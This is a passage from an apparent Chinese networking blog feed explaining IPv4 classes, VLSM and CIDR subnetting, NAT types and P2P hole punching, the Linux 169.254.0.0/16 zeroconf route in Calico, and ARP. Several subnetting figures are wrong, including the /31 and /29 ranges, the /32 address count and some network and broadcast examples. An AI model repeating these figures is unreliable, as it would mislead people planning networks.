<ul>
<li>
<p>网络段 <em>Net-id</em>：用来标识一个网络。</p>
</li>
<li>
<p>主机段 <em>Host-id</em>：用来区分一个网络内的不同主机，对于网络号相同的设备，无论实际所处的物理位置如何，他们都处在同一个网络中。</p>
</li>
</ul>
<h3 id="ip地址的分类">IP地址的分类</h3>
<p>分类网络 <em>classful addressing</em>，描述互联网网络的一个术语，将IPv4的IP地址分为5类，每个类别地址都由他们前三位标识，定义了网络的大小或者类型。</p>
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th style="text-align:center">前缀位</th>
<th style="text-align:center">网络地址位数</th>
<th style="text-align:center">剩余的位数</th>
<th style="text-align:center">网络数</th>
<th style="text-align:center">每个网络的主机数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">A类地址</td>
<td style="text-align:center">0</td>
<td style="text-align:center">8</td>
<td style="text-align:center">24</td>
<td style="text-align:center">128</td>
<td style="text-align:center">16,777,214</td>
</tr>
<tr>
<td style="text-align:center">B类地址</td>
<td style="text-align:center">10</td>
<td style="text-align:center">16</td>
<td style="text-align:center">16</td>
<td style="text-align:center">16,384</td>
<td style="text-align:center">65,534</td>
</tr>
<tr>
<td style="text-align:center">C类地址</td>
<td style="text-align:center">110</td>
<td style="text-align:center">24</td>
<td style="text-align:center">8</td>
<td style="text-align:center">2,097,152</td>
<td style="text-align:center">254</td>
</tr>
<tr>
<td style="text-align:center">D类地址（群播）</td>
<td style="text-align:center">1110</td>
<td style="text-align:center">未定义</td>
<td style="text-align:center">未定义</td>
<td style="text-align:center">未定义</td>
<td style="text-align:center">未定义</td>
</tr>
<tr>
<td style="text-align:center">E类地址（保留）</td>
<td style="text-align:center">1111</td>
<td style="text-align:center">未定义</td>
<td style="text-align:center">未定义</td>
<td style="text-align:center">未定义</td>
<td style="text-align:center">未定义</td>
</tr>
</tbody>
</table>
<p>可用的主机地址总是 $2^n - 2$（ <em>n</em> 是所用的位数，减2是因为第一个和最后一个地址都是无效的）。因此，对于用8位来表示主机地址的C类地址来说，主机数就是254。</p>
<table>
<thead>
<tr>
<th style="text-align:center">分类</th>
<th style="text-align:center">前缀码</th>
<th style="text-align:center">开始地址</th>
<th style="text-align:center">结束地址</th>
<th style="text-align:center">对应CIDR修饰</th>
<th style="text-align:center">默认子网掩码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">A类地址</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0.0.0.0</td>
<td style="text-align:center">127.255.255.255</td>
<td style="text-align:center">/8</td>
<td style="text-align:center">255.0.0.0</td>
</tr>
<tr>
<td style="text-align:center">B类地址</td>
<td style="text-align:center">10</td>
<td style="text-align:center">128.0.0.0</td>
<td style="text-align:center">191.255.255.255</td>
<td style="text-align:center">/16</td>
<td style="text-align:center">255.255.0.0</td>
</tr>
<tr>
<td style="text-align:center">C类地址</td>
<td style="text-align:center">110</td>
<td style="text-align:center">192.0.0.0</td>
<td style="text-align:center">223.255.255.255</td>
<td style="text-align:center">/24</td>
<td style="text-align:center">255.255.255.0</td>
</tr>
<tr>
<td style="text-align:center">D类地址 （群播）</td>
<td style="text-align:center">1110</td>
<td style="text-align:center">224.0.0.0</td>
<td style="text-align:center">239.255.255.255</td>
<td style="text-align:center">/4</td>
<td style="text-align:center">未定义</td>
</tr>
<tr>
<td style="text-align:center">E类地址 （保留）</td>
<td style="text-align:center">1111</td>
<td style="text-align:center">240.0.0.0</td>
<td style="text-align:center">255.255.255.255</td>
<td style="text-align:center">/4</td>
<td style="text-align:center">未定义</td>
</tr>
</tbody>
</table>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">A类地址
</span></span><span class="line"><span class="cl">  0.  0.  0.  0 = 00000000.00000000.00000000.00000000
</span></span><span class="line"><span class="cl">127.255.255.255 = 01111111.11111111.11111111.11111111
</span></span><span class="line"><span class="cl">                  0nnnnnnn.HHHHHHHH.HHHHHHHH.HHHHHHHH
</span></span><span class="line"><span class="cl">B类地址
</span></span><span class="line"><span class="cl">128.  0.  0.  0 = 10000000.00000000.00000000.00000000
</span></span><span class="line"><span class="cl">191.255.255.255 = 10111111.11111111.11111111.11111111
</span></span><span class="line"><span class="cl">                  10nnnnnn.nnnnnnnn.HHHHHHHH.HHHHHHHH
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C类地址
</span></span><span class="line"><span class="cl">192.  0.  0.  0 = 11000000.00000000.00000000.00000000
</span></span><span class="line"><span class="cl">223.255.255.255 = 11011111.11111111.11111111.11111111
</span></span><span class="line"><span class="cl">                  110nnnnn.nnnnnnnn.nnnnnnnn.HHHHHHHH
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">D类地址
</span></span><span class="line"><span class="cl">224.  0.  0.  0 = 11100000.00000000.00000000.00000000
</span></span><span class="line"><span class="cl">239.255.255.255 = 11101111.11111111.11111111.11111111
</span></span><span class="line"><span class="cl">                  1110XXXX.XXXXXXXX.XXXXXXXX.XXXXXXXX
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">E类地址
</span></span><span class="line"><span class="cl">240.  0.  0.  0 = 11110000.00000000.00000000.00000000
</span></span><span class="line"><span class="cl">255.255.255.255 = 11111111.11111111.11111111.11111111
</span></span><span class="line"><span class="cl">                  1111XXXX.XXXXXXXX.XXXXXXXX.XXXXXXXX
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="专用-ip-地址">专用 IP 地址</h3>
<p>专用 IP 地址是内部地址，不能通过互联网路由，例如 RFC 1918 地址。所有专用 IP 地址都是内部 IP 地址；但是，并非所有内部 IP 地址都是专用 IP 地址。</p>
<p>因特网域名分配组织<a href="https://baike.baidu.com/item/IANA/2800158">IANA</a>组织（Internet Assigned Numbers Authority）保留了以下三个IP地址块用于私有网络。</p>
<ul>
<li>
<p>10.0.0.0 - 10.255.255.255 (10/8比特前缀)</p>
</li>
<li>
<p>172.16.0.0 - 172.31.255.255 (172.16/12比特前缀)</p>
</li>
<li>
<p>192.168.0.0 - 192.168.255.255 (192.168/16比特前缀)</p>
</li>
</ul>
<h3 id="vlsm">VLSM</h3>
<p>可变长子网掩码 <em>VLSM</em> ，是为了有效使用无类别域间路由(CIDR)和路由汇聚(route summary)来控制路由表的大小，它是网络管理员常用的IP寻址技术，VLSM就是其中的常用方式，可以对子网进行层次化编址，以便最有效的利用现有的地址空间。</p>
<p><strong>VLSM的优点</strong>：</p>
<ul>
<li>IP地址的使用更加有效</li>
<li>应用路由汇总时，有更好的性能</li>
<li>与其他路由器的拓扑变化隔离</li>
</ul>
<p>如 <code>192.168.1.0/24</code> 其二进制地址为</p>
<p><code>11000000.10101000.00000001.00000000</code></p>
<p>⑴ 确定子网掩码的长度为24；</p>
<p>⑵ 确定子网下的主机可用地址范围 $2^n - 2$  即为 <code>192.168.1.1</code> ~ <code>192.168.1.254</code> （第一个可用IP和最后一个可用IP）；</p>
<p>⑶ 确定网络地址（主机位全为0 <code>192.168.0.0</code>）和广播地址（主机位全为1 <code>192.168.0.255</code>）不能分配计算机主机。</p>
<p><strong>VLSM允许把子网继续划分为更小的网络</strong></p>
<table>
<thead>
<tr>
<th>子网掩码</th>
<th>子网数</th>
<th>主机数</th>
<th>IP数</th>
</tr>
</thead>
<tbody>
<tr>
<td>/25<br/>255.255.255.1| 0000000<br/>255.255.255.128</td>
<td>2<br><em>192.168.0.0 ~ 192.168.0.127</em><br><em>192.168.0.128 ~ 192.168.0.254</em></td>
<td>$2^n - 2=128-2=126$</td>
<td>128</td>
</tr>
<tr>
<td>/26<br/>255.255.255.11 | 000000<br/>255.255.255.192</td>
<td>4<br/><em>192.168.0.0 ~ 192.168.0.63</em><br/><em>192.168.0.64 ~ 192.168.0.127</em><br/><em>192.168.0.128 ~ 192.168.0.191</em><br/><em>192.168.0.192 ~ 192.168.0.255</em></td>
<td>$2^n - 2=64-2=62$</td>
<td>64</td>
</tr>
<tr>
<td>/27<br/>255.255.255.111 | 00000<br/>255.255.255.224</td>
<td>8<br/><em>192.168.0.0 ~ 192.168.0.31</em><br/><em>192.168.0.32 ~ 192.168.0.63</em><br/><em>192.168.0.64 ~ 192.168.0.95</em><br/><em>192.168.0.96 ~ 192.168.0.127</em><br/><em>192.168.0.128 ~ 192.168.0.159</em><br/><em>192.168.0.160 ~ 192.168.0.191</em><br/><em>192.168.0.192 ~ 192.168.0.223</em><br/><em>192.168.0.224 ~ 192.168.0.255</em></td>
<td>$2^n - 2=32-2=30$</td>
<td>32</td>
</tr>
<tr>
<td>/28<br/>255.255.255.1111 | 0000<br/>255.255.255.240</td>
<td>16<br/><em>192.168.0.0 ~ 192.168.0.15</em><br/><em>192.168.0.16 ~ 192.168.0.31</em><br/>&hellip;<br><em>192.168.0.224 ~ 192.168.0.239</em><br/><em>192.168.0.240 ~ 192.168.0.255</em></td>
<td>$2^n - 2=16-2=14$</td>
<td>16</td>
</tr>
<tr>
<td>/29<br/>255.255.255.11111 | 000<br/>255.255.255.248</td>
<td>32<br/><em>192.168.0.0 ~ 192.168.0.7</em><br/><em>192.168.0.8 ~ 192.168.0.15</em><br/>&hellip;<br/><em>192.168.0.232 ~ 192.168.0.247</em><br/><em>192.168.0.248 ~ 192.168.0.255</em></td>
<td>$2^n - 2=8-2=6$</td>
<td>8</td>
</tr>
<tr>
<td>/30<br/>255.255.255.111111 | 00<br/>255.255.255.252</td>
<td>64<br/><em>192.168.0.0 ~ 192.168.0.3</em><br/><em>192.168.0.4 ~ 192.168.0.7</em><br/>&hellip;<br/><em>192.168.0.248 ~ 192.168.0.251</em><br/><em>192.168.0.252 ~ 192.168.0.255</em></td>
<td>$2^n - 2=4-2=2$</td>
<td>4</td>
</tr>
<tr>
<td>/31<br/>255.255.255.1111111 | 0<br/>255.255.255.254</td>
<td>作为网段是无效的，一个网络地址和一个广播地址，剩余可用IP数量为0，<strong>但是作为IP段这个段有两个IP地址</strong>，一般指当前位数与后一位的IP如：<br>192.168.0.1/31 即代表<br>192.168.0.1 <br>192.168.0.2</td>
<td>$2^n - 2=2-2=0$</td>
<td>2</td>
</tr>
<tr>
<td>/32<br/>255.255.255.11111111<br/>255.255.255.255</td>
<td>作为网段是无效的，网络地址和广播地址都不够分配，<strong>但是作为IP段这个段有两个IP地址</strong>，一般指当前IP本身，如：<br/>192.168.0.1/32 即代表<br/>192.168.0.1</td>
<td></td>
<td>1</td>
</tr>
</tbody>
</table>
<h3 id="cidr-supa-href11asup">CIDR <sup><a href="#1">[1]</a></sup></h3>
<p>无类别域间路由 <em>Classless Inter-Domain Routing</em>，是一个按位的、基于前缀的，用于解释IP地址的标准。通俗来讲是通过把多个地址块组合到一个路由表表项而使得路由更加方便。</p>
<p>例如，指定一个CIDR块为10.10.1.32/27，则根据CIDR比特位比较，10.10.1.44是属于该块，但10.10.1.90则不是，如下图所示：</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/400px-IP_Address_Match.svg.png" alt="img"  /></p>
<center>图：CIDR块</center>
<center><em>Source：</em>https://zh.wikipedia.org/zh-cn/%E6%97%A0%E7%B1%BB%E5%88%AB%E5%9F%9F%E9%97%B4%E8%B7%AF%E7%94%B1</center>
<p>那么这个IP地址表计算方式为：$2^n-2 = 32-2=30$，<code>10.10.1.33 ~ 10.10.1.62</code> 其中网络地址（主机位全为0 <code>10.10.1.32</code>, <code>10.10.1.111| 00000</code> ）和广播地址（主机位全为1 <code>10.10.1.63</code>，<code>10.10.1.111| 10000   </code> ）不能分配计算机主机。</p>
<h3 id="cidr与vlsm的区别">CIDR与VLSM的区别</h3>
<ul>
<li>
<p><em>CIDR</em> 是把几个标准网络合成一个大的网络</p>
</li>
<li>
<p><em>VLSM</em> 是把一个标准网络分成几个小型网络(子网)</p>
</li>
<li>
<p><em>CIDR</em> 是子网掩码往左边移了，<em>VLSM</em> 是子网掩码往右边移了</p>
</li>
</ul>
<h2 id="reference">Reference</h2>
<blockquote>
<p><sup id="1">[1]</sup> <a href="https://zh.wikipedia.org/zh-cn/%E6%97%A0%E7%B1%BB%E5%88%AB%E5%9F%9F%E9%97%B4%E8%B7%AF%E7%94%B1">CIDR</a></p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>P2P打洞技术</title>
      <link>https://www.oomkill.com/2021/06/understand-hole-punchine-mechnism/</link>
      <pubDate>Wed, 02 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/06/understand-hole-punchine-mechnism/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="p2p-概述">P2P 概述</h2>
<p>相比于 <code>C/S</code> <code>B/S</code> 架构来说， <code>P2P</code> 是由 Peer 组成。每个Peer同时是客户端也是服务器。这意味着，P2P网络中的peer点为每个其他的peer提供服务，所有节点直接相互通信，没有中心节点，并共享资源源相互联系。</p>
<p>P2P有结构化的P2P网络和非结构化P2P网络。如<code>TomP2P</code> (Java的一个框架，一个分布式哈希表，提供去中心化的键/值基础设施）。而<code>Gnutella </code>(第一个分散式P2P文件共享网络)，是非结构化 （unstructured）P2P网络的。另外还有两种类型的P2P网络，即集中式（centralized）P2P网络（Napster）和混合（hybrid p2p）peer网络（如Skype）。</p>
<h2 id="nat网络">NAT网络</h2>
<p>由于NAT的网络模型，破坏了主机 Peer之间的端到端连接，因此P2P网络需要穿过NAT网络，而穿过NAT网络是目前为P2P技术面临的一个很大的挑战。</p>
<p>网络地址转换，NAT （<code>Network Address Translation</code>）是一种模糊指明的机制，可以将两个IP连接在一起，一个NAT设备总是拥有至少两个IP地址，（公网IP，私网IP），NAT就是将数据包上的IP地址在传输时，将私网IP转换为公网IP。每个NAT设备会维护一个NAT表，该表存储了所有活动的连接。</p>
<p>在创建网络映射后，NAT将源IP地址和端口更改为外部源IP地址和端口。NAT保留端口，不将新端口分配给外部源。一旦创建了映射，只要映射存在，与之联系的设备就能够发回消息。不存在NAT映射的所有来自外部的通信请求都是无法穿越NAT。因此，在P2P环境中，如果两个peer位于在NAT之后，两者都无法直接联系，因为它们之间不知道外部IP地址和源端口，NAT表中并没有其所维护的映射信息。所以NAT穿越中的主要问题之一是网络地址转换问题。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20211111234731102.png" alt="image-20211111234731102"  /></p>
<h3 id="nat网络类型">NAT网络类型</h3>
<p><strong>一般来讲， NAT网络可以分为四种类型</strong>:  <a href="https://www.ietf.org/rfc/rfc3489.txt">nat type</a></p>
<ul>
<li>全锥型(Full Cone)</li>
<li>受限锥型(Restricted Cone)， 或者说是IP受限锥型</li>
<li>端口受限锥型(Port Restricted Cone), 或者说是IP + PORT受限锥型</li>
<li>对称型(Symmetric)</li>
</ul>
<h4 id="full-cone-nat-全锥形">Full Cone NAT 全锥形</h4>
<p>全锥形网络（Full Cone NAT） 的工作原理类似于 IP 地址一对一映射。 内部 IP 和端口映射到相同的外部地址和端口。 之后，任何外部源都可以通过向外部地址发送数据包来访问内部主机。 这意味着，一旦创建了映射，任何外部主机都可以联系内部主机。如下图</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20211111235318310.png" alt="image-20211111235318310"  /></p>
<h4 id="地址受限形的锥形nat--address-restricted-cone-nat">地址受限形的锥形NAT  Address Restricted Cone NAT</h4>
<p>地址受限形锥形 NAT是，仅当内部主机先联系外部主机时，受限锥形 NAT 才会为相应的内部主机分配外部IP。 外部主机然后能够通过分配的外部地址联系内部主机。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20211111235606437.png" alt="image-20211111235606437"  /></p>
<h4 id="对称型-symmetric-nat">对称型 Symmetric nat</h4>
<p>对称 NAT 是最难穿过的NAT，因为对称将随机端口分配给映射。 如果外部主机首先与内部主机连接，则外部主机只能知道外部映射。 在 P2P 场景中， 如果两个Peer（主机）位于 NAT 后面，则它们无法互相通信以让另一个对等体知道所使用的映射。 此外，对称 NAT 几乎不可能知道分配的端口以通过打孔（hole Punching）建立连接。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20211112000834349.png" alt="image-20211112000834349"  /></p>
<h4 id="反向连接-reverse-connection">反向连接 Reverse Connection</h4>
<p>反向连接（Reverse Connection）是一种通讯机制，它允许不使用防火墙或 NAT 设备的Peer使用中继（或服务器）连接到另一个使用防火墙（或不带 UPnP、NAT-PmP 或类似机制的 NAT 设备）的Peer建立直接连接。该机制的工作原理如下。设 A 和 B 为网络设备。 A 没有使用任何类型的防火墙，而 B 使用防火墙。假设也是服务器（或中继）S</p>
<p>假设 <code>A</code> 和<code> B</code> 为网络设备。 A 没有使用任何类型的防火墙，而 B 使用防火墙（或也是服务器、中继）S。<code>A</code>要连接到<code>B</code>。<code>A</code>首先向<code>S</code>发送连接建立请求，然后<code>S</code>使用与<code>A</code>已经建立的连接将此消息转发给 <code>B</code>, 一旦 <code>B</code> 与 <code>S</code> 建立连接，<code>S</code> 开始帮助<code>B</code>连接到 <code>A</code>。在 <code>A</code> 和 <code>B</code> 都完成连接后，尽管 <code>B</code> 使用防火墙（或 NAT 设备），但 <code>A</code> 已经能够与<code>B</code>形成了 Peer to Peer直接通信。</p>
<p>反向连接设置的优点是两个网络设备即使使用了防火墙（或 NAT 设备）也能够进行通信。但是这种机制有各种限制。首先，仅允许两个设备中的一个使用防火墙（或 NAT 设备）。其次，防火墙后面的设备（或 NAT 设备）必须像中继一样连接到外部主机 或服务器。第三，不使用任何防火墙的设备（或NAT设备）需要知道防火墙后面设备的地址，并且需要能够连接到已经连接到防火墙后面设备（或NAT设备）的主机）。</p>
<p>仅当所有前面提到的限制都适用时，反向连接才可用。但是，由于当今许多家庭宽带都在使用 NAT 和防火墙，因此这不是连接位于 NAT 设备或防火墙后面的 P2P 网络的两个Peer的可靠的选择。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20211112002041307.png" alt="image-20211112002041307"  /></p>
<h4 id="upnp">UPnP</h4>
<p>在当今的家庭宽带网络中，在很多情况下，两端的Peer都使用了 NAT 设备，无法建立连接。 而 <code>UPnP</code> <strong>通用即插即用</strong>（Universal Plug and Play），即使为了解决此网络环境下的一种网络架构，从而可以使用P2P网络。简而言之，<code>UPnP</code> 技术的工作过程如下：</p>
<ul>
<li>寻址 （Addressing）：使每个设备都获得一个 IP 地址。</li>
<li>发现 （Discovery）：UPnP Control Point，通知所有设备或其他所有设备通知其他们的存在。</li>
<li>描述（Description）：UPnP Control Point 学习其他设备的能力。</li>
<li>控制（Control）：UPnP Control Point 向设备发送命令。</li>
<li>事件（Eventing）：UPnP Control Point 监听设备的状态的变化。</li>
<li>展示（Presentation）：UPnP Control Point 显示设备的用户界面。</li>
</ul>
<p>UPnP特点：</p>
<ul>
<li>能够在任何类型的 NAT 或防火墙阻止的情况下进行通信</li>
<li>可能无法在路由器和服务器上启用</li>
<li>不提供身份验证机制</li>
<li>不支持多层 NAT</li>
</ul>
<h4 id="nat端口映射协议">NAT端口映射协议</h4>
<p><strong>NAT端口映射协议</strong>（NAT Port Mapping Protocol，简写**<code>NAT-PMP</code>**）是苹果公司于 2005 年开发的 NAT 。该协议是 NAT 设备的扩展。</p>
<h4 id="打洞-hole-punching">打洞 Hole Punching</h4>
<p>打洞（Hole Punching）是可以使NAT 后面的两个网络设备通过让另一个设备知道它们的私有断定与公共端点之间的映射信息来相互联系。 因此，它属于基于的NAT打洞机制。 必要条件是需要存在一个第三方网络设备，该设备可以获得两设备间的信息，并进行信息交换的服务器。 Hole Puching的工作原理如下:</p>
<ul>
<li>Host A 和 Host B 都向Host  C(中继器) 发送 UDP 数据包。当数据包通过它们的 NAT 时，NAT 将源 IP 地址重写为其公网可访问的 IP 地址。它也可能重写源端口号，在这种情况下，UDP 打孔几乎是不可能的。</li>
<li>C 记录来自 Host A 和Host B 的传请求的 IP 与端口。</li>
<li>C 将两者（Host A、B）信息交换 （告诉A B的IP端口，告诉B A的IP端口）</li>
<li>Host A 和Host  B 的第一个数据包在进入彼此的 NAT设备 时被拒绝。然而，当数据包从 A 的 NAT 在端口X传递到 B 的 NAT 时，NAT A 注意到了它，因此在其防火墙上打了一个洞，以允许来自 B 的 NAT 的 IP 的传入数据包，从端口 X . B 的 NAT 也会发生同样的情况，它制定了一个规则，允许来自 A 的 NAT 的 IP 地址的数据包从端口 Y传入。</li>
<li>完成时，当 Host A 和 Host B 相互发送数据包时，此时会被接受，即完成了P2P网络。</li>
</ul>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20211115000012830.png" alt="image-20211115000012830"  /></p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20211115000245628.png" alt="image-20211115000245628"  /></p>
<h2 id="reference">Reference</h2>
<blockquote>
<p><a href="https://blog.csdn.net/yhc166188/article/details/107966193">打洞</a></p>
<p><a href="http://www.52im.net/thread-2872-1-1.html">P2P技术详解(三)：P2P中的NAT穿越(打洞)方案详解(进阶分析篇)</a></p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>Linux中169.254.0.0/24的路由来自哪里</title>
      <link>https://www.oomkill.com/2021/02/linux-1692540024/</link>
      <pubDate>Mon, 08 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/02/linux-1692540024/</guid>
      <description></description>
      <content:encoded><![CDATA[<p>在Linux中，发现每次系统启动时，都会将（<code>169.254.0.0/16</code>）路由启动并将其添加到路由表中。但是并不知道这条路由具有什么功能和它到底来自于哪里？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ route -n
</span></span><span class="line"><span class="cl">Kernel IP routing table
</span></span><span class="line"><span class="cl">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
</span></span><span class="line"><span class="cl">0.0.0.0         10.0.0.2        0.0.0.0         UG    0      0        0 eth0
</span></span><span class="line"><span class="cl">10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
</span></span><span class="line"><span class="cl">169.254.0.0     0.0.0.0         255.255.0.0     U     1002   0        0 eth0
</span></span></code></pre></td></tr></table>
</div>
</div><p>要想搞清楚路由（<code>169.254.0.0/16</code>）究竟来自哪里并且它的作用是什么？首先需要搞明白两个概念</p>
<h2 id="zeroconf">zeroconf</h2>
<p>　　“<code>zeroconf</code>”或“<code>Zero Configuration Networking</code>” 是一种无需额外配置即可自动创建IP地址网络的技术。也被称为 “<code>Automatic Private IP Addressing</code>”（APIPA）。</p>
<p>　　zeroconf规范的提出者是Apple公司，其目的是让非专业用户也可以便捷的连接各种网络设备，例如计算机，打印机等。整个搭建网络的过程都是自动实现。如果没有“<code>zeroconf</code>”，用户必须手动，或者利用对应的服务（例如DHCP、DNS）对网络进行配置。这些过程对非技术用户和新用户们来说是很一件难的事情。</p>
<p>　　<strong>zeroconf的出现是问了解决三个问题：</strong></p>
<ul>
<li>为网络设备自动分配可用IP地址</li>
<li>解析计算机主机名</li>
<li>自动发现网络服务（如打印机等）</li>
</ul>
<h2 id="zeroconf的地址选用">zeroconf的地址选用</h2>
<p>对于Link-local address，IPv4使用的特殊保留地址<code>169.254.0.0/16</code>，在<a href="https://tools.ietf.org/html/rfc3927">RFC3927</a>中所描述。作用是当DHCP客户端在超时和重试后扔找不到对应的DHCP服务器，它将随机从该网络(｀169.254.0.0/16｀)中获取地址。这样可以与无法获取DHCP地址的主机进行通信。</p>
<h2 id="如何禁用zeroconf">如何禁用zeroconf</h2>
<p>要在系统引导期间禁用zeroconf路由，需要编辑<code>/etc/sysconfig/network</code>文件，配置以下内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">NETWORKING=YES
</span></span><span class="line"><span class="cl">HOSTNAME=localhost.localdomain
</span></span><span class="line"><span class="cl">NOZEROCONF=yes
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="1692540016的应用">169.254.0.0/16的应用</h2>
<p>在calico中就使用了这个地址<code>169.254.0.0/16</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">default via 169.254.1.1 dev eth0
</span></span><span class="line"><span class="cl">169.254.1.1 dev eth0 scope link
</span></span></code></pre></td></tr></table>
</div>
</div><p>　　这个IP地址169.254.1.1是默认的网关，但是整个网络中中没有一张网卡是这个地址。那么为何是这个地址？</p>
<p>　　如一个网络中设备D1 (<code>192.168.0.2/24</code>) 与设备D2 (<code>192.168.1.2/24</code>)，D1和D2在相互通信时，D1先发送了ARP广播，请求D2的mac地址，但是由于两个设备处于不同网，也就是说D1的ARP请求会被R1拦截到，然后R1会封装自己的mac地址为目的地址发送一个ARP回应数据报给R1（善意的欺骗），然后R1就会代替D1去访问D2。</p>
<p>　　在Kubernetes Calico网络中，当一个数据包的目的地址不是本网络时，会先发起ARP广播，网关设置即<code>169.254.1.1</code>收到会将自己的mac地址返回给发送端，后续的请求由这个veth对进行完成，使用代理arp做了arp欺骗。这样做抑制了arp广播攻击，并且通过代理arp也可以进行跨网络的访问。</p>
<p>　　在容器内可以使用<code>ethtool -S</code> 来查看对端。这里使用的容器为<code>cylon/netbox</code>，集成了常用的网络命令，作为网络故障排除容器使用。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed//img/1380340-20210208001431302-943041080.png" alt=""  /></p>
<h3 id="实验查找calico网络中16925411的应用">实验：查找calico网络中169.254.1.1的应用</h3>
<p>当从netbox02（10.244.140.69/32） ping netbox01（10.244.241.74/32）发现ARP包被抑制在容器内部，相应的mac地址为eth0的对端</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed//img/1380340-20210208010603231-1136819089.png" alt=""  /></p>
<p>而后根据路由交有tun0隧道进行IPIP封装，tun0为其隧道，隧道解包后发往对应的设备，而calico网络中会生成路由到对应的workload之上。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed//img/1380340-20210208012808567-843686136.png" alt=""  /></p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed//img/1380340-20210208012754309-291149638.png" alt=""  /></p>
<blockquote>
<p>reference</p>
<p><a href="https://en.wikipedia.org/wiki/Zero-configuration_networking">wiki_zero-configuration-network</a></p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>ARP与ARP Proxy</title>
      <link>https://www.oomkill.com/2021/01/arp-proxy-and-arp/</link>
      <pubDate>Wed, 20 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/arp-proxy-and-arp/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="什么是arp">什么是arp</h2>
<p>地址解析协议，<code>Address Resolution Protoco</code>，使用ARP协议可实现通过IP地址获得对应主机的的物理地址（MAC）</p>
<p>在TCP/IP的网络环境下，每个互联网的主机都会被分配一个32位的IP地址，这种互联网地址是在网际范围标识主机的一种逻辑地址。为了让报文在物理网路上传输，还补习要知道对方目的主机的物理地址才行。这样就存在把IP地址变换成物理地址的地址转换问题。</p>
<p>在以太网环境，为了正确地向目的主机传送报文，必须把目的主机的32为IP地址转换成为目的主机48位以太网地址(MAC),这个就需要在互联层有一个服务或功能将IP地址转换为相应的物理地址(MAC)，这个服务就是ARP协议.</p>
<p>所谓的&quot;地址解析&quot;，就是主机在发送帧之前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证主机间互相通信的顺利进行.</p>
<p>ARP协议和DNS有相像之处。不同点是：DNS实在域名和IP之间解析，另外ARP协议不需要配置服务，而DNS要配置服务才行。</p>
<h3 id="arp缓存表">ARP缓存表</h3>
<p>在每台安装有TCP/IP协议的设备都会有一个ARP缓存表（windows命令提示符里输入<code>arp -a</code>即可）， 表里的IP地址与MAC地址是一一对应的。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025172742176.png" alt="image-20221025172742176"  /></p>
<div class="highlight"><div class="chroma">
